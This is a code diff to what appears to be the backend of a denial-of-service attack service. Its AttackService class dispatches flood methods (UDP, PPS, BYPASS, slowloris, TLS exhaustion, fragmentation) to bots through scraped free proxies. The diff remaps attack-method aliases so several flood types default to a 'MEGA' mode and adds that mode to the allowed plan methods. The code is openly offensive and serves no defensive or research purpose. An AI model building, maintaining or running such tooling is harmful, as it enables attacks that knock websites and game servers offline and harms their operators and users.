@@ -67,8 +67,10 @@ async def fetch_free_proxies(limit=500):
 
 def _normalize_method(m: str) -> str:
     """Map legacy / alias method names to current bot methods."""
-    u = (m or "PSPE").upper().strip()
-    if u in ("MEGA", "PORT", "SCAN", "UDP"):
+    u = (m or "MEGA").upper().strip()
+    if u in ("UDP", "PPS", "FJIUM-PPS", "HEX", "GUDP", "BYPASS"):
+        return "MEGA"
+    if u in ("PORT", "SCAN"):
         return "PSPE"
     if u in ("TLS_EXHAUST", "SSL"):
         return "TLS"
@@ -78,7 +80,7 @@ def _normalize_method(m: str) -> str:
         return "TCP"
     if u in ("NRO",):
         return "GAME"
-    if u in ("PSPE", "TCP", "TLS", "HTTP", "GAME"):
+    if u in ("MEGA", "PSPE", "TCP", "TLS", "HTTP", "GAME"):
         return u
     return u
 
@@ -87,9 +89,9 @@ def _normalize_plan_methods(raw) -> list:
     out = []
     for m in (raw or []):
         n = _normalize_method(m)
-        if n in ("PSPE", "TCP", "TLS", "HTTP", "GAME") and n not in out:
+        if n in ("MEGA", "PSPE", "TCP", "TLS", "HTTP", "GAME") and n not in out:
             out.append(n)
-    return out or ["PSPE", "TCP", "TLS", "HTTP", "GAME"]
+    return out or ["MEGA", "PSPE", "TCP", "TLS", "HTTP", "GAME"]
 
 
 class AttackService:
@@ -253,7 +255,7 @@ class AttackService:
                         "fragmentation": int(data.fragmentation),
                         "slowloris": int(data.slowloris or method == "SLOWLORIS"),
                         "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST" or method == "TLS"),
-                        "mega_mode": int(data.mega_mode or method == "PSPE" or method == "MEGA"),
+                        "mega_mode": int(data.mega_mode or method == "MEGA"),
                         "payload": data.payload or "",
                         "proxies": proxy_list,
                         "open_ports": open_ports_str,  # "80,443,3389,1433,..."
